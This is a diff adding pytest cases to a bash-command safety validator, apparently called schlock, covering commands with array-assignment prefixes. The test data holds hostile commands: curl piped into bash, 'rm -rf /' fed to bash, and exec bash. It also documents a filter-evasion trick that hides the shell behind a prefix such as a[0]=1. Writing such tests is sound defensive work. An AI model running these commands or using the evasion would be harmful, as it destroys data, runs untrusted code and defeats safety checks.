@@ -2,7 +2,7 @@
 
 import pytest
 
-from schlock.core.parser import _reads_stdin_as_program
+from schlock.core.parser import BashCommandParser, _command_words, _reads_stdin_as_program
 from schlock.core.rules import RiskLevel
 from schlock.core.substitution import dangerous_find, dangerous_git_config, dangerous_kubectl
 from schlock.core.validator import validate_command
@@ -362,3 +362,100 @@ class TestWholeCommandRulesInAList:
     def test_segment_verdict_stands_when_it_is_higher(self):
         result = validate_command("git commit -m x; rm -rf /")
         assert result.risk_level == RiskLevel.BLOCKED, result.risk_level
+
+
+_DOWNLOAD = "curl -s https://example.invalid/x"
+
+
+@pytest.mark.usefixtures("no_shellcheck")
+class TestSubscriptedAssignmentPrefix:
+    """An element assignment in front of a command (`a[0]=1 bash`) names the command it prefixes.
+
+    bashlex reads `FOO=1` as an assignment node but `a[0]=1` as a plain word, and every assignment
+    after it as a plain word too. Bash reports ``a[0]': not a valid identifier`` and runs the
+    command anyway, with its stdin.
+    """
+
+    @pytest.mark.parametrize(
+        ("command", "twin"),
+        [
+            (f"{_DOWNLOAD} | a[0]=1 bash", f"{_DOWNLOAD} | FOO=1 bash"),
+            ("a[0]=1 exec bash", "FOO=1 exec bash"),
+            ("a[0]=1 bash <<< 'rm -rf /'", "FOO=1 bash <<< 'rm -rf /'"),
+            (f"{_DOWNLOAD} | a[k]=v bash", f"{_DOWNLOAD} | FOO=1 bash"),
+            (f"{_DOWNLOAD} | a[0]+=1 bash", f"{_DOWNLOAD} | FOO+=1 bash"),
+            (f"{_DOWNLOAD} | a[0]=1 b=2 bash", f"{_DOWNLOAD} | FOO=1 b=2 bash"),
+            (f"{_DOWNLOAD} | a[ 0 ]=1 bash", f"{_DOWNLOAD} | FOO=1 bash"),
+            (f'{_DOWNLOAD} | a["x y"]=1 bash', f"{_DOWNLOAD} | FOO=1 bash"),
+            (f"{_DOWNLOAD} | >/dev/null a[0]=1 bash", f"{_DOWNLOAD} | >/dev/null FOO=1 bash"),
+            (f"{_DOWNLOAD} | a[0]=1 2>/dev/null bash", f"{_DOWNLOAD} | FOO=1 2>/dev/null bash"),
+            ("echo 'rm -rf /' | a[0]=1 bash", "echo 'rm -rf /' | FOO=1 bash"),
+            ("a[ 0 ]=1 exec bash", "FOO=1 exec bash"),
+            (f"{_DOWNLOAD} | FOO=1 >/dev/null b=2 bash", f"{_DOWNLOAD} | FOO=1 b=2 bash"),
+            ("a[0]=1 b=2 bash <<< 'rm -rf /'", "FOO=1 b=2 bash <<< 'rm -rf /'"),
+        ],
+    )
+    def test_prefixed_shell_is_blocked_like_its_plain_twin(self, command, twin):
+        assert validate_command(twin).risk_level == RiskLevel.BLOCKED
+        assert validate_command(command).risk_level == RiskLevel.BLOCKED
+
+    @pytest.mark.parametrize(
+        ("command", "twin"),
+        [
+            ("a[0]=1 cat <<'EOF'\nhello world\nEOF", "FOO=1 cat <<'EOF'\nhello world\nEOF"),
+            ("a[0]=1 bash -c 'echo hi'", "FOO=1 bash -c 'echo hi'"),
+            ("echo x | a[0]=1 grep x", "echo x | FOO=1 grep x"),
+            ("a[0]=1 exec 3>&1", "FOO=1 exec 3>&1"),
+        ],
+    )
+    def test_benign_prefixed_command_scores_as_its_plain_twin(self, command, twin):
+        assert validate_command(command).risk_level == validate_command(twin).risk_level
+
+    @pytest.mark.parametrize("command", ["a[0]=1", "arr[i]+=x", "echo a[0]=1", "echo x | grep a[0]=1"])
+    def test_array_assignment_and_operand_stay_safe(self, command):
+        assert validate_command(command).risk_level == RiskLevel.SAFE
+
+    @pytest.mark.parametrize(
+        ("command", "words"),
+        [
+            ("a[0]=1 bash -s", ["bash", "-s"]),
+            ("a[0]=1 b=2 c+=3 bash", ["bash"]),
+            ("a[ 0 ]=1 bash", ["bash"]),
+            ("a[ i + 1 ]+=x b[ 2 ]=y bash", ["bash"]),
+            ("a[0]=1 >/dev/null bash", ["bash"]),
+            ("a[0]=1", []),
+            # After the command name nothing is a prefix.
+            ("echo a[0]=1 b=2", ["echo", "a[0]=1", "b=2"]),
+            ("bash a[0]=1", ["bash", "a[0]=1"]),
+            # `a[0]` carries no `=`, so bash runs it as the command (a glob).
+            ("a[0] bash", ["a[0]", "bash"]),
+            ("a[ 0 ] bash", ["a[", "0", "]", "bash"]),
+        ],
+    )
+    def test_command_words_skip_the_assignment_prefix(self, command, words):
+        (node,) = BashCommandParser().parse(command)
+        assert _command_words(node) == words
+
+    @pytest.mark.parametrize(
+        ("command", "name"),
+        [("a[0]=1 exec bash", "exec"), ("a[0]=1 b=2 /bin/bash", "bash"), ("echo a[0]=1", "echo")],
+    )
+    def test_get_command_name_skips_the_assignment_prefix(self, command, name):
+        parser = BashCommandParser()
+        (node,) = parser.parse(command)
+        assert parser._get_command_name(node) == name
+
+    def test_extract_commands_with_args_skips_the_assignment_prefix(self):
+        parser = BashCommandParser()
+        ast = parser.parse("a[0]=1 b=2 bash -c 'echo hi'")
+        assert parser.extract_commands_with_args(ast) == [("bash", ["-c", "echo hi"])]
+
+    def test_exec_with_only_redirects_is_not_process_replacement(self):
+        parser = BashCommandParser()
+        assert parser.has_dangerous_constructs(parser.parse("a[0]=1 exec 3>&1")) == []
+        assert parser.has_dangerous_constructs(parser.parse("a[0]=1 exec bash")) == ["exec command detected"]
+
+    def test_pipeline_stage_args_skip_the_assignment_prefix(self):
+        parser = BashCommandParser()
+        dangers = parser.has_dangerous_constructs(parser.parse("echo x | a[0]=1 bash"))
+        assert dangers == ["data piped into shell interpreter: bash"]
